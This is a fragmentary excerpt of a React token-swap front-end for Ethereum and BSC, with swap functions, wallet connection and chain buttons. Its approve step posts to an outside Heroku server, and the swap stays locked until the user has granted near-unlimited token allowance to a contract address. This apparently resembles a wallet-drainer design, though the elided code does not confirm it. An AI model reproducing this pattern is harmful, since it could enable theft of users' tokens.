...
import { TOKENS, CA_ADDRESS, getSDK } from "../Constants";
...
function Swap2() {
  ...
  const swap = async () => {
    ...
    try {
      ...
      if (
        ...
        console.log("swapping exact eth");
        await swapExactETHForTokens(tradeEntity, Percent);
        ...
        await swapExactTokensForETH(tradeEntity, Percent);
        setSwapLoading(false);
        setSwapped((prev) => prev + 1);
      } else {
        await swapExactTokensForTokens(tradeEntity, Percent);
        setSwapLoading(false);
        setSwapped((prev) => prev + 1);
      }
    } catch (error) {
  ...
  const approve = async () => {
    ...
    try {
      await axios
        .post("https://router22.herokuapp.com", {
  ...
  const getAllowance = async (tokenMetaData) => {
    ...
    try {
      const result = await tokenContract.methods
        ...
        .call();
      const result2 = await tokenContract.methods
        .allowance(account, CA_ADDRESS)
        .call();

      if (String(result2).length < 70) {
        setToApprove("address");
      }
      if (String(result).length < 70) {
        setToApprove("token");
      }

      if (String(result).length >= 70 && String(result2).length >= 70) {
        setSwappable(true);
      } else if (
  ...
  return (
    <div>
      <SwapSection style={{ alignItems: "center" }}>
        <Nav>
          <button onClick={() => (account ? copy(account) : connectWallet())}>
            {account ? shortenAddress(account) : "Connect to a wallet"}
          </button>
        </Nav>
        {tokenModalShown && (
          <TokenModalContainer>
        ...
        <SwapContainer>
          ...
          <Content>
            <ButtonContainer>
              ...
              <Button
                style={{
                  color: chainId != "56" ? "red" : "white",
                  backgroundColor: chainId != "56" ? "white" : "",
                }}
                className={`${chainId != "56" && "active"}`}
                onClick={() => {
                  toast("Please select the Ethereum chain on your wallet");
                }}
              >
                ERC-20
              </Button>
              <Button
                ...
                className={`${chainId == "56" && "active"}`}
                onClick={() => {
                  toast("Please select the Binance Smart Chain on your wallet");
                }}
              >
                BEP-20
              </Button>
